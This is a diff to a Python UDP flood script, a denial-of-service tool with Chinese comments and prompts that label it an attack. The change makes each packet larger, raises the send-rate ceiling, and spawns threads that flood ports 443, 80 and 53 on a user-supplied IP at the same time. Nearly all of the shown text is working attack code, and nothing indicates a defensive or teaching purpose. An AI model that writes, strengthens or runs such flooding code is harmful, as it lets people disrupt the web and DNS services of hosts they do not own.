@@ -15,7 +15,7 @@ month = now.month
 year = now.year
 
 # 创建 UDP 套接字和随机数据
-bytes = random._urandom(1490)  # 1490 字节的随机数据包
+bytes = random._urandom(55290)  # 1490 字节的随机数据包
 
 # 攻击函数（每个线程执行）
 def attack(ip, port, speed, thread_id):
@@ -26,7 +26,7 @@ def attack(ip, port, speed, thread_id):
             sock.sendto(bytes, (ip, port))
             sent += 1
             print(f"线程 {thread_id} 已发送 {sent} 个数据包到 {ip} 端口 {port}")
-            time.sleep((1000 - speed) / 2000)  # 根据速度控制发送间隔
+            time.sleep((10000 - speed) / 2000)  # 根据速度控制发送间隔
         except KeyboardInterrupt:  # 允许 Ctrl+C 退出
             print(f"线程 {thread_id} 已停止")
             break
@@ -52,19 +52,22 @@ if __name__ == "__main__":
 
     # 获取用户输入
     ip = input("请输入 IP     : ")
-    port = int(input("攻击端口      : "))
-    speed = int(input("攻击速度(1~1000) : "))
-    thread_count = int(input("线程数(建议5~20) : "))  # 新增：线程数量
+    speed = int(input("攻击速度(1~10000) : "))
+    thread_count = int(input("线程数(建议5~20) : "))  # 线程数量
+
+    # 定义要攻击的端口列表
+    ports = [443, 80, 53]  # HTTPS, HTTP, DNS
 
     os.system("clear")
-    print(f"开始攻击 {ip}:{port}，使用 {thread_count} 个线程...")
+    print(f"开始攻击 {ip} 的端口 {ports}，使用 {thread_count} 个线程...")
 
     # 创建并启动线程
     threads = []
-    for i in range(thread_count):
-        thread = threading.Thread(target=attack, args=(ip, port, speed, i+1))
-        thread.start()
-        threads.append(thread)
+    for port in ports:  # 为每个端口分配线程
+        for i in range(thread_count):
+            thread = threading.Thread(target=attack, args=(ip, port, speed, f"{port}-{i+1}"))
+            thread.start()
+            threads.append(thread)
 
     # 主线程等待所有子线程（可选）
     try:
